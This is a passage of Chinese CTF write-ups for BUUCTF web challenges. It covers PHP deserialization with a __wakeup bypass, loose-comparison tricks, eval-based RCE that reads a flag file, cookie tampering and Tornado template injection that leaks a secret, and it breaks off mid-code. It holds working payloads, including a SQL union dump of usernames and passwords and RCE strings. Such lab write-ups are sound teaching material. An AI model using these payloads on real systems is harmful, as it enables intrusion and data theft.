1,group_concat(username),group_concat(passwoorrd) frfromom b4bsql#</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221014222131054-166704781973444.png" alt="image-20221014222131054" style="zoom:67%;" /><br><hr><br><h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p>进去啥都找不到,先拿<code>dirsearch</code>工具扫一下网站目录:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py dirsearch.py -u &quot;http://725eb650-f8d1-40ae-b65d-7e2f77fe5288.node4.buuoj.cn:81&quot; -e php</span><br></pre></td></tr></table></figure><p>扫到一个<code>www.zip</code>,访问下载之,得到源码文件</p><p>反序列化漏洞</p><p><code>index.php</code>和<code>flag.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">////</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>class.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到,这里需要在访问<code>index.php</code>的时候(也就是打开题目的那个页面),用GET传一个<code>select</code>字符串,这个字符串会被反序列化为对象</p><p><code>index.php</code>包含了<code>class.php</code>,而在<code>class.php</code>中定义了一个名为<code>Name</code>的类,其中还包含了若干魔术方法</p><p>其中,在<code>__destruct</code>方法中(对象被销毁时调用,执行<code>unserialize</code>时也会调用此方法),如果<code>username</code>的值为<code>admin</code>,且<code>password</code>的值为100,就会打印flag</p><p>因此按照要求构建<code>select</code>字符串就可以了</p><p><strong>快速构建字符串,直接把类以及序列化的相关代码拿到本地来执行,生成符合要求的字符串:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Name</span>(<span class="string">&#x27;admin&#x27;</span>, <span class="number">100</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面的代码输出字符串:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure><p>但目前的问题是,执行反序列化时相当于生成了一个对象,因此会调用<code>__wakeup</code>方法,此方法会将<code>username</code>的值修改为<code>guest</code></p><p>那么现在就需要设法绕过<code>__wakeup</code>方法来执行反序列化:</p><p>当成员属性数量和实际的属性数量不一致的时候,可以绕过<code>__wakeup方法</code>,所以这里把属性数从2改为3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure><p>但执行了之后发现反序列化并没有成功,这里<code>__construct</code>都没有被调用</p><img src="/images/buuctf-web/image-20221015184358169-166704781973445.png" alt="image-20221015184358169" style="zoom:67%;" /><blockquote><p><strong>这里补充知识点:</strong></p><p><strong>在序列化<code>serialize</code>时, 对于<code>private</code>属性,生成字符串中的属性名表现为「类名+属性名」,也就像上面的<code>Nameusername</code></strong></p><p><strong>但是其实在类名的两侧还各有一个空字节,但是当复制这个字符串并直接执行反序列化的时候,这个空字节并不会被带上,反序列化函数执行时发现格式出现了错误,因此也就导致了反序列化生成对象失败</strong></p><p><strong>因此这里构建被反序列化的字符串时,需要人工在类名的两端各加上一个<code>%00</code></strong></p></blockquote><p>如此以来,payload为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure><p>提交后获得flag</p><p>关于反序列化详细可见<a href="fd61bb58.html">unserialize</a></p><br><hr><br><h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p>进去之后啥也没有<img src="/images/buuctf-web/image-20221015212828444.png" alt="image-20221015212828444" style="zoom:67%;" /></p><p>拿<code>dirsearch</code>扫一下:(这里指定了一下请求延时,因为频繁出429可能是因为网站有防扫限制)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py dirsearch.py -u &quot;http://60994b4a-a1d4-49fb-91dc-a26b5c7a2bd1.node4.buuoj.cn:81/&quot; -e php --delay=2</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221015213020368-166704781973447.png" alt="image-20221015213020368" style="zoom:67%;" /><p>扫到一个<code>index.php.bak</code>,访问下载它,打开之后发现是源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据源码逻辑, 需要GET传参数<code>key</code>, 必须是数字,且<code>intval</code>取整之后要等于字符串<code>str</code>的值:</p><p>这里的漏洞是<code>==</code>为弱相等,不检测数据类型,只要值相等就会返回<code>TRUE</code></p><p>并且,如果比较的一边为数字,一边为字符串,那么比较时如果字符串的开头有数字,那么会将这段数字的值作为字符串的值,直到遇到第一个字母,如果字符串的开头不是数字,那么将把字符串视为数字0.</p><p>那么这里的字符串就会被视为<code>123</code>,所以<code>key</code>的值传123即可</p><br><hr><br><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>进来发现是一个计算器,查看源码:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="string">&#x27;#calc&#x27;</span>).<span class="title function_">submit</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">            <span class="attr">url</span>:<span class="string">&quot;calc.php?num=&quot;</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">&quot;#content&quot;</span>).<span class="title function_">val</span>()),</span><br><span class="line">            <span class="attr">type</span>:<span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">            <span class="attr">success</span>:<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">                $(<span class="string">&quot;#result&quot;</span>).<span class="title function_">html</span>(<span class="string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;strong&gt;答案:&lt;/strong&gt;<span class="subst">$&#123;data&#125;</span></span></span><br><span class="line"><span class="string">            &lt;/div&gt;`</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">error</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="title function_">alert</span>(<span class="string">&quot;这啥?算不来!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这里注意到有一个<code>calc.php</code>,尝试访问发现直接返回了源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>); <span class="comment">//如果没传num,将直接打印源码</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>]; </span><br><span class="line">    <span class="comment">//黑名单过滤符号</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>); <span class="comment">//可利用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这里给<code>num</code>传命令的话会被组织,应该是有防火墙:</p><img src="/images/buuctf-web/image-20221015221127741-166704781973446.png" alt="image-20221015221127741" style="zoom:67%;" /><p>这里可以利用<strong>php的字符串解析特性</strong></p><blockquote><p>php在将参数解析为变量时,会:</p><ul><li>去除开头的空白字符</li><li>将一些非法字符转换为下划线</li></ul><p>那么,如果防火墙会对GET传的参数<code>num</code>进行检测,那么再传参的时候只需要在<code>num</code>前面加上一个空格,传 <code>? num=...</code>即可,因为对防火墙来说,它要检查的变量是<code>num</code>,而这里的变量是<code> num</code>. 而对php来说,即使前面加了一个空格,它仍会将此变量解析为<code>num</code></p></blockquote><p>利用此漏洞成功执行命令:<img src="/images/buuctf-web/image-20221015221731309-166704781973448.png" alt="image-20221015221731309" style="zoom:67%;" /></p><p>这里因为过滤了好多符号,需要<strong>进行无参数的RCE</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">? num=Print_r(scandir(dirname(dirname(dirname(getcwd())))))</span><br><span class="line">这里getcwd返回当前目录的绝对路径</span><br><span class="line">dirname函数返回上级目录的绝对路径</span><br></pre></td></tr></table></figure><p>先尝试扫描一下目录,找找flag文件在什么地方</p><img src="/images/buuctf-web/image-20221015223408729.png" alt="image-20221015223408729" style="zoom:80%;" /><p>那么需要想办法读取该文件: <strong>可以利用<code>chr</code>函数将<code>ascii</code>码转为需要的字符</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">chr</span>(<span class="number">47</span>).<span class="title function_ invoke__">chr</span>(<span class="number">102</span>).<span class="title function_ invoke__">chr</span>(<span class="number">49</span>).<span class="title function_ invoke__">chr</span>(<span class="number">97</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>)) <span class="comment">//这些ascii码拼接起来就是</span></span><br></pre></td></tr></table></figure><p>另一种方法: 可以在GET中引入其他不被过滤的参数来执行命令</p><ul><li><code>get_defined_vars()</code>返回由所有已定义变量所组成的数组</li></ul><img src="/images/buuctf-web/image-20221015225417058-166704781973449.png" alt="image-20221015225417058" style="zoom:67%;" /><p>可以看到,GET数组是其中的第一个,所以进一步,用<code>current()</code>函数取到GET数组:</p><img src="/images/buuctf-web/image-20221015225518264-166704781973450.png" alt="image-20221015225518264" style="zoom:67%;" /><p>那么在GET时多传一个参数,也将出现在这个数组里:</p><img src="/images/buuctf-web/image-20221015225601337-166704781973451.png" alt="image-20221015225601337" style="zoom:67%;" /><p>进一步通过<code>end()</code>函数来取到这个新添加的参数</p><img src="/images/buuctf-web/image-20221015225626502-166704781973452.png" alt="image-20221015225626502" style="zoom:67%;" /><p>那么,通过<code>eval</code>来执行第二个参数的内容:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=eval(end(current(get_defined_vars())))&amp;a=show_source(&#x27;/f1agg&#x27;);</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221015230302935-166704781973454.png" alt="image-20221015230302935" style="zoom:67%;" /><br><hr><br><h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p>进去查看源码,发现<code>pay.php</code></p><img src="/images/buuctf-web/image-20221016155959055-166704781973453.png" alt="image-20221016155959055" style="zoom: 50%;" /><p>再查看源码,发现了提示:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="comment">// POST传password,不能是数字,且等于404</span></span><br></pre></td></tr></table></figure><p>那么根据php弱相等的判定,<strong>这里传404+其他非数字字符就可以了</strong></p><p>另外,根据网页的提示,<code>Only Cuit&#39;s students can buy the FLAG</code></p><p>这里看到<code>Cookie</code>中有user字段,那么把它的值改为1试试:</p><img src="/images/buuctf-web/image-20221016161259938-166704781973455.png" alt="image-20221016161259938" style="zoom:67%;" /><p>这里认证成功了,但POST的数据并没有被识别</p><img src="/images/buuctf-web/image-20221016161146239-166704781973456.png" alt="image-20221016161146239" style="zoom:67%;" /><p>从浏览器端使用插件POST数据,然后抓包再修改<code>Cookie</code>,成功:</p><img src="/images/buuctf-web/image-20221016161441429-166704781973457.png" alt="image-20221016161441429" style="zoom:67%;" /><p><strong>这里提示数字过长,那把money用科学计数法<code>1e9</code>表示,拿到flag</strong></p><img src="/images/buuctf-web/image-20221016161544146-166704781973458.png" alt="image-20221016161544146" style="zoom:67%;" /><br><hr><br><h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>进来有三个链接,点开<code>flag.txt</code>是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt</span><br><span class="line">flag in /fllllllllllllag</span><br></pre></td></tr></table></figure><p><code>hints.txt:</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure><p><code>welcome.txt</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/welcome.txt</span><br><span class="line">render</span><br></pre></td></tr></table></figure><p>观察下这里请求的url,发现都是通过<code>filename</code>参数传了文件名,然后用<code>filehash</code>参数传了一个哈希值,结合上面的提示,这个哈希值应该是来自<code>md5(cookie_secret+md5(filename))</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://8b426cb6-305f-48b9-9231-dd7b76fcbfd6.node4.buuoj.cn:81/file?filename=/flag.txt&amp;filehash=bb8c681f3462f5158682769afeddfdfc</span><br></pre></td></tr></table></figure><p>那么现在需要找到<code>cookie_secret</code>的值,随便尝试一下,发现尝试一下,发现参数变成了<code>msg</code></p><img src="/images/buuctf-web/image-20221016163642917-166704781973459.png" alt="image-20221016163642917" style="zoom:67%;" /><p>这里需要补充知识了: 具体解释可见<a href="f7296425.html">Web杂项</a></p><blockquote><p><a href="http://www.tornadoweb.org/"><code>Tornado</code></a> 是一个<code>Python web</code>框架和异步网络库，起初由 <a href="http://friendfeed.com/">FriendFeed</a> 开发. 通过使用非阻塞网络I&#x2F;O， Tornado可以支撑上万级的连接，处理 <a href="http://en.wikipedia.org/wiki/Push_technology#Long_polling">长连接</a>, <a href="http://en.wikipedia.org/wiki/WebSocket">WebSockets</a> ，和其他需要与每个用户保持长久连接的应用. (<strong>也就是一个开源的Web服务器软件,特点是非阻塞</strong>)</p></blockquote><p><code>Tornado</code>中能搜到关于<code>cookie_secret</code>变量的解释:</p><img src="/images/buuctf-web/image-20221016170103446.png" alt="image-20221016170103446" style="zoom:80%;" /><blockquote><p><strong><code>render</code><strong>是<code>python</code>中的一个</strong>渲染函数</strong>，也就是一种<strong>模板</strong>，<strong>通过调用的参数不同，生成不同的网页</strong> ，如果用户对**<code>render</code>**内容可控，不仅可以注入<code>XSS</code>代码，而且还可以通过<code>&#123;&#123;&#125;&#125;</code>进行传递变量和执行简单的表达式。</p><p>将给定的模板与给定的上下文字典组合在一起，并以渲染的文本返回一个 <code>HttpResponse</code> 对象。</p></blockquote><p>因此这里相当于传进去一个值为<code>Error</code>的参数后,被<code>render</code>处理,也就是替换到模板中的某个特定位置,并返回到浏览器上渲染呈现:</p><img src="/images/buuctf-web/image-20221016171017464-166704781973460.png" alt="image-20221016171017464" style="zoom:67%;" /><p>修改这个参数的值的话,相应地也会被浏览器渲染成对应内容:</p><img src="/images/buuctf-web/image-20221016171125521-166704781973461.png" alt="image-20221016171125521" style="zoom:67%;" /><p>看见了<code>render</code>,这里的考点是<code>SSTI(模板注入)</code></p><p><code>Tornado</code>存在一些可以访问的快速对象，例如**<code>&#123;&#123;handler.settings&#125;&#125;</code>**,里面存储着一些环境变量</p><p>那么就可以构造payload了:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure><p>拿到<code>cookie_secret</code>的值:</p><img src="/images/buuctf-web/image-20221016173021640-166704781973464.png" alt="image-20221016173021640" style="zoom:67%;" /><p>按照提示使用python脚本来计算哈希值:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">filename = <span class="string">&quot;/hints.txt&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>) </span><br><span class="line">cookie_secret = <span class="string">&quot;cbeec37a-57fa-4c1e-b6ec-d2bfa8299e8e&quot;</span></span><br><span class="line"><span class="built_in">print</span>(md5((cookie_secret+md5(filename).hexdigest()).encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest())</span><br><span class="line">//md5计算之前,字符串需要就行编码, hexdigest()将计算后的结果转为<span class="number">16</span>进制的形式</span><br><span class="line">//输出47a12639aff3f99db8fb73f4105ba530, 验证和访问hint.txt时的一致</span><br><span class="line">//接下来把/hints.txt换成/fllllllllllllag就行了</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221016174710697-166704781973462.png" alt="image-20221016174710697" style="zoom:67%;" /><br><hr><br><h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><h2 id="flask的session伪造"><a href="#flask的session伪造" class="headerlink" title="flask的session伪造"></a>flask的session伪造</h2><p>在注册登录后的修改密码界面查看源码,可以找到一个网址,打开后发现是网站的源码(flask)</p><img src="/images/buuctf-web/image-20221016215058822.png" alt="image-20221016215058822" style="zoom:67%;" /><p>其中<code>index.html</code>这里网站是<code>flask</code>做的, 这里看源码像是还有<code>SSTI</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 